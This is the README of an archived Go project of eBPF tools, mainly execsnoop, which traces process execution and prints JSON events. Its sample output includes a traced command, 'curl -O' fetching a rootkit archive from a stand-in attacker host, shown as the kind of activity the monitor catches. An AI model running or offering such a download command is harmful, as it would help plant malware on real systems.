**NOTE**: This project was an experiment and is now archived. In the time since this experiment
eBPF has come a long way towards reaching the goal of having code that can be written once
and run on every kernel version without needing BCC to compile the BPF code at runtime.
Look up BPF CO-RE.

# go-ebpf

[![Build Status](http://img.shields.io/travis/andrewkroh/go-ebpf.svg?style=flat-square)][travis]
[![Go Documentation](http://img.shields.io/badge/go-documentation-blue.svg?style=flat-square)][godocs]

[travis]: http://travis-ci.org/andrewkroh/go-ebpf
[godocs]: http://godoc.org/github.com/andrewkroh/go-ebpf

go-ebpf is a collection of example tools that use [eBPF][ebpf] to collect
metrics and data from the Linux kernel _without using [bcc][bcc]_. The eBPF
programs are written in restricted C and then compiled into eBPF bytecode
using `clang` and LLVM (`llc`). The bytecode is shipped with the Go program
to avoid having a runtime dependency on `clang` and `llc` (normally you don't
want to have compilers on your production systems).

If the kernel's JIT compiler is enabled the eBPF bytecode will be translated
into native machine code for better performance. The JIT compiler is currently
available for the x86-64, arm64, and s390 architectures. It can be enabled by

`echo 1 > /proc/sys/net/core/bpf_jit_enable`

[ebpf]: https://en.wikipedia.org/wiki/Berkeley_Packet_Filter
[bcc]:  https://github.com/iovisor/bcc

## Installation and Usage

Package documentation can be found on [GoDoc][godocs].

Installation can be done with a normal `go get` or you can download a binary
from the [releases][releases] page. There's also a [Docker image][docker].

[releases]: https://github.com/andrewkroh/go-ebpf/releases
[docker]:   https://hub.docker.com/r/akroh/go-ebpf/tags/

Docker:
```
docker run -it --rm --cap-add=SYS_ADMIN -v /sys/kernel/debug:/sys/kernel/debug akroh/go-ebpf:execsnoop
```

Go:
```
$ go install github.com/andrewkroh/go-ebpf/cmd/execsnoop
```

In order to run the `execsnoop` example the `CAP_SYS_ADMIN` capability is
required. Therefore the program should be run as root.

```
sudo $GOPATH/bin/execsnoop
```

Then in a second terminal if you run a program you will see info about all
the processes. The program outputs JSON events. There are three
different event types -- `started`, `exited`, and `error`.

- `started` - This event is generated at startup for all existing processes by
reading from `/proc` and it is generated anytime there is a successful `execve`
syscall.
- `exited` - This event is generated when a program exits. It contains the same
data as the `started` event along with the end time and elapsed running time.
- `error` - This event is generated when an `execve` syscall results in an
error. For example if `execve` fails because the user does not have permissions
to execute the binary then an error event will be generated with the
`error_code` value.

```json
$ sudo $GOPATH/bin/execsnoop | jq .
{
  "type": "started",
  "start_time": "2017-11-03T15:16:56.890551865Z",
  "ppid": 15785,
  "parent_comm": "bash",
  "pid": 22022,
  "uid": 1000,
  "gid": 1000,
  "exe": "/usr/bin/curl",
  "args": [
    "curl",
    "-O",
    "https://badguy.com/rootkit.tar.gz"
  ]
}
{
  "type": "exited",
  "start_time": "2017-11-03T15:16:56.890551865Z",
  "ppid": 15785,
  "parent_comm": "bash",
  "pid": 22022,
  "uid": 1000,
  "gid": 1000,
  "exe": "/usr/bin/curl",
  "args": [
    "curl",
    "-O",
    "https://badguy.com/rootkit.tar.gz"
  ],
  "end_time": "2017-11-03T15:16:56.908970285Z",
  "running_time_ns": 18418420
}
{
  "type": "error",
  "start_time": "2017-11-03T15:17:18.103922381Z",
  "ppid": 15785,
  "parent_comm": "bash",
  "pid": 22024,
  "uid": 1000,
  "gid": 1000,
  "exe": "/sbin/unix_update",
  "args": [
    "/sbin/unix_update"
  ],
  "error_code": -13
}
```
